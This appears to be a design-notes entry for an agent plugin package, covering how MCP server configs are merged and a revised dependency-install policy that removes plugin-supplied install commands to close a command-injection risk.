- [insight] MCP server merging is fundamentally different from hook merging: hooks are additive (multiple run), MCP servers are keyed entries (collision possible). Namespacing solves this cleanly #mcp #hooks #contrast

## Relations

- extends [[ANALYSIS-010-hook-merge-unmerge-patterns]]
- extends [[ANALYSIS-011-lockfile-management-patterns]]
- extends [[ANALYSIS-012-json-config-merge-patterns]]
- extends [[ANALYSIS-014-platform-config-patterns]]
- relates_to [[ADR-003 Conflict Resolution and Namespacing]]
- relates_to [[ADR-001 Plugin Format and Manifest]]
- relates_to [[ANALYSIS-029-platform-config-registry]]

## P0-2 Resolution: Dependency Policy Revised

The debate (DEBATE-ADR-010, P0-2) rated dependency auto-install from plugin manifests as CVSS 9.1 (arbitrary code execution). The revised policy eliminates this threat vector:

- [decision] Dependencies defined by agent-plugin package (platforms.config.json), NOT by plugin authors in plugin.json. systemDependencies field removed from plugin manifest schema. #dependencies #security #p0-resolution
- [decision] Multiselect prompt (not confirm) for missing deps at install time, all selected by default. User can deselect any to handle manually. #dependencies #ux
- [decision] Package manager dependency chain included: if brew is needed to install claude and brew is missing, both appear in the list. #dependencies #chain-resolution
- [decision] Uninstall shows reverse multiselect of deps installed during install. None selected by default. #dependencies #uninstall
- [outcome] CVSS 9.1 concern mitigated: install commands come from trusted package code, not untrusted plugin manifests. Remaining risk equivalent to any npm package with postinstall scripts. #security #p0-resolution
- [fact] Original check-only recommendation from this analysis superseded by the revised approach. The security argument (CWE-78 from plugin manifests) no longer applies when commands come from the package itself. #dependencies #superseded
